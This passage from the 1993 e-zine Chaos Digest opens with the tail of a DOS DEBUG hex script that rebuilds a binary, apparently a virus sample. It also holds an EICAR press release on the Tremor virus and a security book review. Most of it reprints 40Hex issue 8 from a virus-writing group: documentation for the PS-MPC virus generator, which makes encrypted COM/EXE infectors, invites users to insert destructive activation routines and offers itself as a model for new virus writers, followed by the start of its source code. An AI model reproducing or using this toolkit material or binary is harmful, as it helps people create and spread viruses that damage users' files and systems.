e 0590  1C BD 62 CF 22 8F 12 10 8A 27 A8 9A 9E 62 D5 8F
e 05A0  1D 9D 62 32 EE E1 A2 D7 25 10 6A A7 22 11 47 48
e 05B0  FB 2E 4B BF 60 24 67 E2 AC 11 5A 87 39 A2 B5 67
e 05C0  BD 5F B8 27 4F F3 B3 EF B2 27 C1 9E EC A3 D7 AA
e 05D0  F5 5B 4A 9C 1B BD 62 8E 12 9B A8 58 ED 61 FB DC
e 05E0  63 E2 64 F4 BD F5 C1 F9 31 5B 8C 9D 1A 9D 63 46
e 05F0  0E 50 E4 3F 63 9C 4A 7B 60 2E 4B 77 60 26 C0 9B
e 0600  95 9B EE 8F EE E8 61 1C 60 A2 D7 A1 E2 66 64 87
e 0610  7A 1C 60 22 D8 9F 94 65 A6 BE A7 9E 9C 5F D6 BC
e 0620  32 87 D6 A0 6C 65 D7 9E 6C 6E 13 9C D7 A2 6D 89
e 0630  D8 76 13 9E 6C 89 DC A0 EB D1 12 9D EA A0 4D CA
e 0640  F4 70 6F 1C 48 1C D7 9E 32 84 A3 DC A2 26 43 24
e 0650  67 26 B8 9A A5 26 55 9A 29 24 D8 9A ED 76 1A 9C
e 0660  EC 6B D6 A0 9E A2 D4 9E E8 69 96 5D EC A3 33 82
e 0670  EC F0 83 9A A8 9B ED E1 60 D6 A7 9B D5 DF 4B 11
e 0680  62 E9 6C 92 DC 0D ED D0 A7 10 59 E9 D7 D0 B5 57
e 0690  E6 A2 E8 62 91 73 9F 22 E9 62 F6 4D 91 3C 98 9D
e 06A0  D7 A6 0A 9E D7 9E 13 DA 0A A0 4D A4 0A A0 D7 9E
e 06B0  13 D2 0A 9E D6 9F EC 5D 0D F4 4A D9 62 25 DF 80
e 06C0  0E 5F EE 71 F0 09 64 95 26 23 63 22 E7 21 1D AF
e 06D0  6C 92 DB 4E 9D 8C D7 85 E3 18 46 9B D8 B5 B2 A6
e 06E0  58 10 69 A6 22 11 72 26 29 A7 4F 11 67 D6 66 10
e 06F0  68 F7 6E 2C 0D 5F BB A8 7A 2F 0D 2F 14 9F 34 7C
e 0700  6D 62 0D 5F EE 74 33 84 EE 64 34 7D 22 BF 62 8E
e 0710  11 11 17 29 D8 7A 34 8A E3 D8 65 0E 55 29 A8 7A
e 0720  26 3C 8F 9D FA 6C 43 84 3D 9B D5 0B 05 C5 63 84
e 0730  35 9B D6 9E 94 5C B3 6C 4B 24 AA BD 32 87 02 26
e 0740  6A C0 E1 D8 65 11 69 3A D5 E4 A2 87 A6 D8 66 11
e 0750  70 3A D6 A3 ED 8F 14 A4 35 DC 83 E4 4D CE 9E A2
e 0760  D4 CC D7 C6 32 7F ED FB 84 6C 46 27 DA BD 95 5C
e 0770  1D 9D 62 27 2B 27 5D 25 E2 BD B0 10 78 E2 59 92
e 0780  B5 93 4A C7 2A 23 32 27 29 CF 34 FA 4D 85 97 AB
e 0790  EA A3 BA A6 22 11 FB 6C 91 C5 63 5F EB BA 90 9D
e 07A0  B4 F3 4A E0 60 FB BC F3 21 E0 63 54 62 9B 0E 9A
e 07B0  23 47 0E 9A 2B 47 EB E1 65 26 C0 79 B6 EE 4A 36
e 07C0  64 27 5A 84 5C 9D BC F7 C1 EF A7 10 67 E9 D7 FE
e 07D0  A7 E9 A4 10 6B E6 AF 26 67 84 BB A0 A7 F7 B9 84
e 07E0  68 9E 6D 89 D8 E0 BB E9 1A EC 63 23 A7 80 6D 92
e 07F0  DB BC A7 ED B2 26 A7 9F 86 53 9F 23 D8 E7 9D 08
e 0800  51 11 A9 1C D8 98 65 6C C7 9F DB E6 15 93 13 9F
e 0810  4D DD E3 95 BF 9D D7 A9 E5 85 66 1F 52 9F EC B8
e 0820  94 9B 61 E4 52 57 B3 9D 4D 09 6D 92 DC B0 EC D0
e 0830  4D AC B7 84 14 9D EC E0 63 A8 F2 46 BB A6 58 15
e 0840  64 2E BB 53 62 62 68 67 26 84 EF 97 87 9E 66 23
e 0850  F6 26 29 84 93 9A ED A0 E3 9B BC 9F D5 BF B2 E9
e 0860  94 6E ED 8C 33 08 45 84 99 9B B5 F3 4A 4E 61 84
e 0870  16 9C C1 F6 B3 84 92 9B BC F4 4A 53 66 A6 4F 14
e 0880  67 A8 A2 46 0D 4C D8 46 BE F4 ED 64 8E 63 AB 46
e 0890  6D 5C DB 9F 95 77 26 84 0E 9B B4 56 BC A1 E3 9B
e 08A0  BC 9F D5 0D B6 4F 6A 27 38 84 53 9A BA 5B BB 9D
e 08B0  95 77 EE 73 ED E8 4A 6C 4C 38 D6 A6 9C 14 53 11
e 08C0  68 29 AA EC 5F 46 A6 39 D8 89 AA D7 5C 0F 87 D6
e 08D0  DE 7F D8 A3 ED 96 29 A1 C2 87 7B F3 4A 95 5D C0
e 08E0  69 34 F6 9F 41 D7 3C 13 56 26 68 22 6A 46 9E 96
e 08F0  D8 86 C2 F9 ED 69 8E 6B E6 18 49 9C D6 A2 E3 5D
e 0900  BF 9D 8D 6B EE F0 4E 27 25 9F 33 9F A6 8A BE 1F
e 0910  DF 8A 63 11 65 27 25 84 68 9C F4 F6 ED F8 46 C7
e 0920  A6 86 EC A3 25 CF 2B 3C 8C 9D FA 2F 1D 9A 62 26
e 0930  6A D8 65 10 69 D8 66 11 84 93 3D 6C 46 EF A5 84
e 0940  67 9C BD 56 65 9C EC FB 83 D6 A1 11 70 27 56 9F
e 0950  B2 BD 6C 6E D7 A0 EB EC 83 E5 25 CE 61 1C 8A 1B
e 0960  ED B3 ED 5F 33 7F EE FB 83 1C 5D 9F D4 EC B2 EF
e 0970  4A 84 62 F7 EC 7B B5 84 44 9B F6 F5 BD 26 9A 1C
e 0980  51 A9 D6 A1 E2 62 6A 11 6B 24 D8 9F EA 11 55 87
e 0990  87 1C 61 A1 D5 BB 6C 6E D8 B2 9C F1 45 10 79 C8
e 09A0  70 C0 71 D8 67 0F 6C D8 64 0F 6D 1C 61 9F D4 A1
e 09B0  EA 19 54 4E E3 A6 33 1C 45 1C 6D B3 EA B3 25 84
e 09C0  71 9C 4A AF 5C C0 69 10 75 CE 22 D6 A6 9F D6 A7
e 09D0  4A A1 5C C0 65 11 65 4C 6A D0 66 34 EE 74 E9 14
e 09E0  5B A6 61 10 4E 46 26 63 A7 9E 61 1C 95 9B ED A3
e 09F0  87 1B 63 6C 46 56 63 9B AB 10 4E 26 97 E4 D6 82
e 0A00  EE F3 83 14 44 EC B4 EF EC 7A 4B 76 62 F7 BB F4
e 0A10  9E A8 D7 DC 6C 6E D8 6A 9D D0 D6 66 B3 ED B5 EE
e 0A20  4A AA 64 F6 ED E0 63 D6 52 11 67 A6 46 10 68 4F
e 0A30  E8 84 26 98 BE 4C D8 46 A8 10 76 1D 62 F5 65 0E
e 0A40  67 1C A8 9B BA 27 2A 23 AA FF EB 23 4A 9C AF E3
e 0A50  ED 73 4E 05 B3 ED 6C 6E D8 FF 9C 10 64 11 C1 26
e 0A60  A7 9F 6C 5C DB BD 86 A3 D6 A4 9C A0 D6 B5 9E 9F
e 0A70  D4 B1 E2 11 61 9E 58 E0 65 DC D6 D7 B2 A8 3A 26
e 0A80  43 4C 5A 47 BB 87 93 84 B1 95 1C A4 62 EC EC 62
e 0A90  6F EC 0C F4 15 1C 46 BF B1 E5 A2 C0 69 34 EE 74
e 0AA0  ED FC 5A A6 46 10 49 E7 D7 A6 BD EF 94 9B ED C3
e 0AB0  6C 80 DB 75 4B 19 64 2F 61 DC 5A 26 56 F7 B4 84
e 0AC0  88 9B 4B 08 64 F6 BA 62 A7 9F E2 D8 6E 11 6F 27
e 0AD0  3D 27 3A C7 35 24 BA 9B 4C BE 63 26 4F EC 6C 6E
e 0AE0  D8 C0 E2 9A E3 11 73 C8 67 D8 66 4C 64 0E 64 DC
e 0AF0  EC 8C 6F F4 0C 87 72 A6 58 14 6E D6 96 10 6A 26
e 0B00  41 CE 61 9A AB 94 BB 4F 6E C8 6B 10 78 4F 86 E4
e 0B10  D6 AC 66 A2 FA 15 C8 4F 96 DC D6 A2 15 9F DC 9E
e 0B20  15 C7 EC E0 63 A6 34 11 7B 1C 49 23 E3 97 8E 11
e 0B30  66 1C 31 DC EA 10 66 84 AB 97 D6 0D 6D 5C D7 9D
e 0B40  A7 1C 56 A2 B4 DE A4 1F 5D A1 BC 0F A4 A7 22 14
e 0B50  75 1C 5E D1 D7 D4 A4 11 97 26 53 4C 65 4F 5A 26
e 0B60  4E 87 37 A7 34 15 68 93 3D 1C 56 C4 6E DC E2 97
e 0B70  68 10 65 A8 6A 46 AD 10 97 46 4E CD 13 A0 D7 CB
e 0B80  6C 6E D7 A2 1A 56 65 46 F5 47 F4 87 33 E6 6C 5C
e 0B90  D7 B0 E2 7F 9B A8 22 A6 3A 26 25 34 96 5E 13 1D
e 0BA0  D8 9F 12 1F 5C 46 F6 46 F5 47 D6 9D B1 87 AE DD
e 0BB0  9E A3 D6 68 A3 D8 66 38 D6 9E 8E 9E 6C 6E D8 DF
e 0BC0  B2 4C 64 4F ED 26 4E 1C 61 9F D6 9D A5 84 67 97
e 0BD0  BB 39 B3 0E 6F 54 E3 BB E6 00 46 10 67 46 13 7D
e 0BE0  0E F4 15 6F 15 9D EC 10 64 84 6E 97 F5 1C 5E 5D
e 0BF0  D7 A3 32 84 D5 A0 F5 46 F5 46 EB 08 65 26 D7 9D
e 0C00  94 6E 26 4F 24 39 D6 A7 EC 87 59 5E 6B 10 67 92
e 0C10  3D D0 63 1C 45 AB D6 81 E3 96 64 10 68 D6 C6 7F
e 0C20  D7 60 16 6D E3 96 66 0E 20 EC 12 4D ED 7E 0E 87
e 0C30  13 26 A7 9D FA EC E3 9B BC 9F D5 A1 ED 74 EB 14
e 0C40  53 A6 34 11 6A 4F EE 84 E9 96 D6 A1 6E 54 0D 2E
e 0C50  0E F4 25 9C 62 B2 6E 08 6F E4 7E CE 7B CC 77 7C
e 0C60  75 CC 77 34 6D D5 6D 35 6F C0 70 C0 70 34 6D D5
e 0C70  6D 34 6D CC 77 CC 77 CC 77 7B 72 6C 73 7C 75 6C
e 0C80  73 7C 75 6C 73 7C 75 CC 77 7C 75 CC 77 34 6D D5
e 0C90  6D 35 6F C0 70 C0 70 34 6D D5 6D 34 6D CC 77 CC
e 0CA0  77 CC 77 7B 72 6C 73 7C 75 CC 77 CC 77 9B 62 A0
e 0CB0  66 A8 66 A4 66 A0 6E A0 6A A0 66 A4 66 A0 6A A0
e 0CC0  66 A8 66 A4 66 A0 6E A0 6A A0 66 A8 66 A4 66 A0
e 0CD0  6A A0 66 A4 66 A0 6E A0 6A E4 7E CC 77 0E 79 7C
e 0CE0  75 CC 77 E4 7E 3D 84 CE 7B 5A 82 7C 75 CC 77 0E
e 0CF0  79 CE 7B E4 7E E4 7E 9B 62 A4 6E A0 66 A0 66 A0
e 0D00  72 A4 66 A0 72 A4 6A B4 2F BC 62 9C 82 86 4C BC
e 0D10  A4 CA 75 80 03 2A 74 60 4A E9 73 40 83 08 75 A9
e 0D20  25 C8 E4
rcx
0C23
w
q

------------------------------

Date: Fri Jun 25 06:01:28 GMT 1993
From: percomp@infohh.rmi.de (perComp-Verlag GmbH )
Subject: File 2--Consequences du virus TREMOR (communique)


EICAR--European Institute for Computer Anti-Virus Research

PRESS RELEASE

                   Consequences of the Tremor-Virus
                   --------------------------------

The authors of virus are concentrating more and more on the development of
techniques with hide their virus against anti-virus programs and which cause
a growing amount of work for analysing the virus-code.  The Bulgarian Mutating
Engine (MtE) --which can be used to ease the development of polymorphic
viruses-- is only one example.  It is remarkable that only a few new viruses
were found up to now which are using the MtE.  Therefore the detection and
the results of the Tremor-Virus are a really bad news.

The first tremor-infected program in Germany was found in January 1993
already.  The following features of the virus were known after a first look
at the virus-code: lengh of the virus is 4,000 byte, the year of the date-
stamp n the directory is increased by 100 and .COM and .EXE files will become
infected, later on we learned, that these features are nos always present.
Due to this fact ll scanners which try to find Tremor did not detect all
samples of this virus.

The very expensive analysis of Tremor which was dne by Christoph Fischer,
MicroNIT Virus Center of the Karlsruhe University, was nearly completed end
of May.  He was sending out the results immediately to all members of CARO.
Established anti-virus manufacturers can also ask for a copy.  Since the
first show up of Tremor nearly four month have passed before the result of
the virus analysis was available.  The sophisticated virus-code as well as
the severe pressure of work to all virus specialists were the reason for this
long time.  Therefore the following requirements should be fuldilled in the
future: the analysis of viruses must be automized as much as possible.  A
better cooperation between the virus specialists working in virus test centers
as well as for anti-virus manufacturers must be established.

The Tremor was probably developed in Germany.  At least one or more German
software distributors delivered diskettes with tremor-infected programs.  The
acccident of "Channel Videodat" --a PKUNZIP.EXE infected with Tremor was
transmitted by cable- and satellit-TV-- was only one of the issues (details
in: Chronologie des Channel-Videodat-Unfalls).  This experience leads to
requirements which must be fulfilled by software-manufacturers and -distri-
butors. It is not enough to use some actual virus scanners to decide whether
a product is free of viruses.  For example checksumming-programs can be used
during the test to detect viruses.  The German BSI (Bundesamt fuer Sicherheit
in der Informationstechnik) will write down such requirements which should
be fulfilles by manufactureres and distributors.

In case of questions, please contact: eicar e.V. c/o perComp-Verlag GmbH,
Holzmuehlenstr. 84, D-22041 Hamburg, telephone: +49 40 693 20 33,
fax: +49 40 695 99 91, e-mail: percomp@infohh.rmi.de

------------------------------

Date: Wed Jun 16 13:25:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC rep )
Subject: File 3--"Computer Security Basics" de Deborath Russell (critique)
Copyright: Robert M. Slade, 1993


O'Reilly and Associates, Inc.
103 Morris St., Suite A
Sebastopol, CA   95472-9902
800-338-6887
fax: 707-829-0104
info@ora.com
Computer Security Basics, Deborah Russell and G. T. Gangemi Sr., 1991,
ISBN 0- 937175-71-4


"Computer Security Basics" is a pretty accurate name.  The book is an overview
of many aspects that go into the security of computers and data systems. While
not exhaustive, it at least provides a starting point from which to pursue
specific topics which require more detailed study.  A thorough reading of the
book will ensure that those charged with security will not miss certain
aspects of the field in a single minded pursuit of one particular threat.

Having said that, it is difficult to recommend the book as a "sole source"
for information.  While it contains a great deal of useful, helpful and
informative material, the quality and accuracy is inconsistent.  One would
do well to check items with other sources.

The book starts with an introduction of what security is, and how to evaluate
potential loopholes.  The definition points out the useful difference between
the problems of confidentiality and availability.  (Also defined is the
difference between a "hacker" and a "cracker".)  The distinction between
threats, vulnerabilities and countermeasures is helpful, but may fail to
resolve certain issues.  (For example, the discussion does not finally aid in
determining whether a manager, too "lazy" to provide good security practices,
is just a vulnerability or an actual threat.)

Chapter two gives some historical background to the development of modern data
security.  Chapter three looks at access control, four at viral programs and
other "malware", five at systems and planning, and six at the "Orange Book".
Chapters seven and eight cover communication, first with encryption and then
more generally. Chapter nine deals with physical and site security, as well as
biometrics (for access control), while ten deals with the specific physical
security of TEMPEST.

The book takes itself very seriously, sometimes even pompously. There does not
appear to be any room for frivolity.  Therefore, it is difficult to know
whether the comment on page 92 that a novel in process may fall into the
category of "important to you, but ... of little interest to anyone else" is
unintentionally funny, or just insulting.

There are "Hints" pages scattered throughout the book, which are generally
very useful and practical.  Not universally: page 87 suggests that you
"vaccinate" programs before running them, seemingly a reference to functions
such as, among others, SCAN's "add verification" which have led to problems
in the past.  Page 97 stresses the importance of never eating or drinking
near the terminal: I, in common with most "habitual" users, *contstantly*
have food or drink near the terminal.  In the past fifteen years only once
has soda made it into my keyboard, and someone else did that.

I have two reasons for dealing with chapter four, "Viruses and Other
Wildlife", in detail.  Firstly, this review was originally intended as part
of a series of reviews of books related to the computer virus situation.
Secondly, the problems of this chapter serve as an illustration of other
parts of the book that deal with specialty areas.

The problems actually start on page seven, where an item entitled "Virus
Flambe" repeats the popular, but wholly unfounded, myth that some viral
programs can cause physical damage.  This report again repeats the "flaming
monitor" urban legend.  (The Jerusalem description, just prior, is not notable
for its accuracy either.)  Once into chapter four, we are told that the
difference between a worm and a virus is that a worm is not destructive,
whereas a virus always is.  The book contradicts itself: we are told both that
a worm hides in host programs and that it does not. I was intrigued to learn
that Ken Thompson's demonstration of a compiler "trapdoor generator" is a
virus, even though it does not "pass along" its ability to generate
insecurities beyond the programs it compiles.  A trojan is apparently a
"mechanism for disguising a virus or worm", always performs the "advertised"
function as opposed to something referred to as a "trojan mule" (anyone else
ever heard this term before?).  "Crabs" are not, as I had thought, prank
programs seen on Mac and Atari computers, but a generic term for programs that
"attack" the screen display.  In the appendix on "Security User Groups", the
Computer Virus Industry Association (CVIA) is mentioned, while the Computer
Antivirus Research Organization (CARO) and EICAR are not.  The International
Computer Security Association is not mentioned with the groups, but makes the
book list.  ("Electronic Groups" mentions Usenet, and a rather aging list of
newsgroups, but doesn't mention the Internet or any of the "listservs".)

Other aspects of the book are excellent.  The coverage of DES, for example,
does not shy away from dealing with the controversy surrounding the standard,
and is very careful in reporting the research that has been done.  The chapter
on TEMPEST is interesting.  It becomes intriguing when TEMPEST is used as a
springboard to discuss the hypothesized health risks of VDTs and states that
TEMPEST may be used to sheild the user (even though it goes on to say that
TEMPEST sometimes involves false "emitters" within the system).

In sum, the book may be a good starting point for beginners who have to start
to deal with computer security at a basic level.  While there are shortcomings
in the material within the book itself, there are also sufficient resources
listed in the appendices to provide a guide for further study by the user.

===================
Vancouver          ROBERTS@decus.ca         | "Power users think
Institute for      Robert_Slade@sfu.ca      |  'Your PC is now
Research into      rslade@cue.bc.ca         |  Stoned' is part of
User               p1@CyberStore.ca         |  the DOS copyright
Security           Canada V7K 2G6           |  line." R. Murnane

------------------------------

End of Chaos Digest #1.63
************************************

Chaos Digest              Mercredi 30 Juin 1993        Volume 1 : Numero 64
                             ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.64 (30 Juin 1993)
File 1--40H VMag Number 8 Volume 2 Issue 4 #000-001(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 8 Volume 2 Issue 4 #000-001(1) (reprint)


40Hex Number 8 Volume 2 Issue 4                                     File 000

     Welcome to 40 Hex issue 8.  First off, this month is going to be
Boot Sector Appreciation Month at 40Hex.  We will have a fully
disassembled Michelangelo, along with a Pakistani Brain variant called
Ashar.  But as always, there is a lot of other news that I have to
discuss with all you, so on with the show.

     For the last couple months, we have recieved quite a bad rap on
Fidonet.  This has to do with the original SKISM Viruses (Like SKISM
1-14).  Like everyone, we had to start somewhere.  So what if our
original virii blew large goats.  Judge us on some of our newer stuff.
Oh, what is this you say?  You can't find our newer stuff?  Well,
neither can McAfee.  Everyone will become enlightened soon enough.
Other people on Fido who have been giving us a hard time, think it
bothers us?  Think again, we love it!  One of our personal favorites is
Gary Watson, who amuses us with each new post, and Tag Line (which are
hysterical).

     Secondly, Hellraiser is back as an author for 40Hex!  He currently
doesn't have a modem, but he can at least do some slave work.  Great to
have you back HR.

     Another way in which 40Hex is going to help support virus community
is by the brand new PHALCON/SKISM Macintosh Programming Team!  The four
people involved in that are Renegade, Sixo, Trojan, and Wintermute!
They will be cranking out a lot of quality Macintosh utilities, trojans
and other interesting things very soon!  Look for them on all of our
BBS's.

     -=PHALCON/SKISM=- Net will be arriving to a BBS near you very soon.
If you are interested, leave mail to any one of our fine support
systems.


                     40Hex-8 Table of contents

          40Hex-8.000......................You Are Here!
          40Hex-8.001......................PS-MPC (MassProducedCode)
          40Hex-8.002......................Putav, an expose!
          40Hex-8.003......................Findav -P/S- Style
          40Hex-8.004......................Checkav -P/S- Original
          40Hex-8.005......................StarShip Virus Info
          40Hex-8.006......................Virus Spotlite: Michelangelo
          40Hex-8.007......................EXE Infectors and you
          40Hex-8.008......................Disassembly of ASHAR
          40Hex-8.009......................Ear-6 source en Espa$ol
          40Hex-8.010......................Letter to the Editor


    Greetings to:  The new and improved [NuKE], FirstStrike, Apache
Warrior, all PHALCON/SKISM Members, Backstabbers and everyone else we
forgot to greet!

                                       -)GHeap

+++++

40Hex Number 8 Volume 2 Issue 4                                     File 001

    Once again, -=PHALCON/SKISM=- pisses off the PD scene.  Now anyone
can make their own virus, and give it to Gary Watson, the only guy on
Fidonet who we love.  Without him, we would never get the fame that we
now covet so greatly.  Well, that is until we got our official Pepsi
Gotta Have It Cards.  Thank you Gary.
                                        -) Gheap
----------------------------- Docs -n- code begin --------------------------

                                    PS-MPC
                   Pretty Slick Multimedia Personal Computer
                                     (NOT)
               Phalcon/Skism Mass-Produced Code Generator 0.90a
                             Created by Dark Angel

TABLE OF CONTENTS

DEDICATION                                                 i
DISCLAIMER                                                ii
PURPOSE                                                   ii
WHAT IS THE PS-MPC?                                        1
USING THE PS-MPC                                           1
NO ACTIVATION ROUTINES                                     1
WHY NO IDE                                                 2
SOURCE CODE AVAILABILITY                                   2
PROBLEMS                                                   2
FUTURE ENHANCEMENTS                                        2
HISTORY OF VIRUS TOOLKITS                                  A

DEDICATION

     The author  hereby releases  this program and its source code into the
public domain  as "freeware."   All  code generated  by the  program  must,
however, retain  the designation  of said program, although all other parts
may be  modified at  the user's  discretion.   The  author  dedicates  this
program to  both the virus and anti-virus communities, both of which profit
from the introduction of the Phalcon/Skism Mass-Produced Code Generator.

     Thanks are  due to  NoWhere Man  for his  excellent program VCL, which
served as the inspiration for this package.

--

DISCLAIMER

     This  program  may  cause  either  the  intentional  or  unintentional
disruption of  normal brain  wave activity  of the  user due to the extreme
shock quality  of the  program.   The author hereby absolves himself of all
liability.  Persons with pacemakers beware!

     The code  produced by  the Phalcon/Skism  Mass-Produced Code Generator
is not  designed to be damaging; however, the author is not responsible for
incidental damages  caused by  use of  the program.  Further, the author is
not responsible  for damages caused by changes to the code generated by the
PS-MPC.   The author does not condone the illegal spread of executable code
created in part or in whole by the PS-MPC.  All source code and  executable
files created with the aid of the PS-MPC must be distributed with the reci-
pient's full knowledge  of the  contents.    Malicious use  of the  code is
strictly prohibited.

PURPOSE

     The Phalcon/Skism  Mass-Produced Code  Generator is  not  designed  to
create malicious  code; rather,  it is  a learning tool from which a person
may learn  to write effective viral code.  The code generated by the PS-MPC
is highly  optimised for  both size  and speed  and is  therefore the  code
generated can  be used  by the fledgling virus writer as a model for future
endeavours.

--

WHAT IS THE PS-MPC?

     The  Phalcon/Skism  Mass-Produced  Code  Generator  is  a  tool  which
generates viral  code according  to user-designated  specifications.    The
output is  in Masm/Tasm-compatible  Intel 8086 assembly and it is up to the
user to  assemble the output into working executable form.  The features of
the PS-MPC include the following:

  o Over  150 encryption  techniques, randomly generated during each run of
    the PS-MPC
  o Compact, commented code, much tighter than VCL
  o COM/EXE infections
  o Two types of traversals
  o Optional infection of Command.Com
  o Critical error handler support

USING THE PS-MPC

     The syntax of the PS-MPC is simple:

     PS-MPC   ...

     The parameters  given to the PS-MPC are the names of the configuration
files.  For example, to create two separate viruses using the configuration
files  FOOBAR1.CFG   and  FOOBAR2.CFG,   simply  type  "PS-MPC  FOOBAR1.CFG
FOOBAR2.CFG" at the prompt.

     The configuration  file is  a text file containing a set of parameters
which define  the output  of the  PS-MPC.   A  sample  configuration  file,
SKELETON.CFG is  included  with  the  package.    This  configuration  file
contains all  the acceptable  parameters that  the PS-MPC  will accept.  It
also includes  the defaults to each of these parameters.  The configuration
file is  self-explanatory, so there is no need to go into further detail at
this time.

     When the  Generator has  completed creating  the source  code  file/s,
simply assemble  the output  file/s  with  your  favorite  assembler/linker
combination.  A multi-pass assembler is recommended.  Masm is a poor choice
for an  assembler; try  Tasm.   Masm requires  the code  to  include  extra
segment overrides which unnecessarily add to the code length.  Masm 6.0 may
fix these  problems (I'm  not sure  since I  don't have  it).  Tasm, on the
other hand,  is an  excellent, fast,  multipass assembler  far superior  to
Masm.

NO ACTIVATION ROUTINES

     I have  not included  any activation  routines in  the package  simply
because I  do not  think  the  power  of  creating  potentially-destructive
viruses should  be in  the hands  of persons  incapable of  coding a simple
activation routine  in assembly.   If  you can rip a simple FAT-annihilator
out of  another trojan,  then I  cannot stop  you from  doing so.  But just
remember that  the most  memorable viruses  are not  necessarily those that
cause the  most damage,  but are usually those that have unusual activation
routines.

     Upon finding  activation conditions,  the PS-MPC will generate a short
stub for  the activation  routine.   This is  located immediately after the
code for  the restoration of the executable files.  It is identified by the
label "activate"  and is  followed by a return.  Insert your own activation
routine between those two lines.

--

WHY NO IDE (Integrated Development Environment)

     Everyone agrees  that Microsoft  Windows is  for cripples.  Obviously,
you, the  user of  the PS-MPC, are no cripple, so you need no puny IDE with
colourful, deluxe  windows to  aid you.  If you are a cripple, go ahead and
create the  configuration file in your favorite Windows text editor.  Hell,
port the  code to  the Macintosh  and you  can be  truly crippled (although
you'll have your pretty windows and icons).

SOURCE CODE AVAILABILITY

     This program  is distributed  with full  source code.    Although  the
source should  be self-explanatory,  I have gone back and commented several
portions in  order to facilitate understanding.  The program was written in
Turbo C  2.0 and  compiled in the tiny memory model.  I trust that you will
not hack  this program and call it your own.  Source code is available only
because I think it will aid in your understanding of the program.

PROBLEMS

     This program  was written  hastily.    The  bulk  of  the  coding  was
completed in  under two  days.   Features were  added  by  the  process  of
accretion during  the following  week.   Needless to  say, the  code is now
extremely unmanageable.  If there is enough interest in the package, I will
rewrite it  in order  to alleviate  the strain  caused in  maintaining such
code.  This will help in adding features as the need arises.

     There MAY be some bugs in this version since it hasn't been thoroughly
tested yet.  Report all bugs to me (duh). Be sure to save the configuration
file of the faulty code so the bug may be reproduced.  Better yet, find the
problem, fix the C source, and send it to me.  Zowie!

FUTURE ENHANCEMENTS

     As you  may have already noticed, this is a pre-1.0 release version of
the Generator.   There  are several  features which  I wish  to add  before
version 1.0.   These  include, but  are not  limited to,  resident viruses,
padded-EXE infections  (shorter routine),  and better  documentation(!).  A
few surprises  will be  thrown in as well.  I do not plan on increasing the
size of  the PS-MPC.COM file dramatically, so with every addition will come
code to  keep the  increase in  file size to a minimum.  I do not intend to
devote too  much time to the project as I personally don't actually use the
generator to spew out code for the group.

Note: The  version included with 40Hex-8 is not the latest version.  Due to
space considerations, we could not include the source code to version  0.91
which is somewhat larger.

--

HISTORY OF VIRUS TOOLKITS

     The first  known virus  toolkit was  called VCS, or Virus Construction
Set.   This program  generated a  new virus each time it was run.  However,
there were  no code differences at all between any two viruses generated by
VCS.   All viruses  generated were  1077 bytes  in length  and all could be
detected with  the identical  scan string.   The advantage in this approach
was that  the user  needed absolutely no knowledge of 8086 assembly to take
advantage of this program.  This program of limited usefulness spawned only
one well-known variant called Manta.  It is not even worth mentioning here.

     The second  virus toolkit  was CrazySoft, Inc.'s Dark Avenger Mutation
Engine (MtE).   This  magnificent work  of Bulgarian  coding allowed  virus
authors to  create viruses  with an  almost limitless  number of decryption
routines.   Although the  author needed  to know how to write 8086 assembly
code, no  knowledge of  the inner workings of MtE save the entry parameters
was needed  to use  this toolkit.   It  has since  spawned several viruses,
including Dedicated, Pogue, Fear, and Groove.

     The next  virus toolkit  to be released was VCL, or Virus Construction
Laboratory.  This was written by NoWhere Man of NuKE.  This toolkit allowed
the user  many options,  including the creation of parasitic COM infectors,
spawning EXE infectors, trojan horses and logic bombs.  Since it could only
handle parasitic  infections of  the COM  file format,  it was  of  limited
usefulness.   Additionally, it  incorporated only  one decryption  formula,
once again  limiting its usefulness.  Further, the initial release included
a quirky  installation program  which  failed  to  install  properly  under
certain conditions.   However,  this  package  contained  a  colourful  IDE
loosely based  on the Borland interface.  This IDE was incredibly simple to
use and  even the  average Joe  could understand  how  to  use  it  without
understanding 80x86  assembly.    Unfortunately,  the  activation  routines
included with  the package  were of  limited usefulness.    Most  of  these
involved manipulating the BIOS memory area at segment 40h.

--

------------------------------ Source code begins ---------------------------
/* FILE: VHEADER.H */
#ifndef __VHEADER_H
#define __VHEADER_H

/* infect */
#define COM     1
#define EXE     2

/* traverse */
#define NONE    0
#define DOT_DOT 1

typedef struct {
  char always;
  char number;
  char month;
  char day;
  int  year;
  char dow;
  int  monthday;
  char hour;
  char minute;
  char second;
  char percentage;
} activation_conditions;

typedef struct {
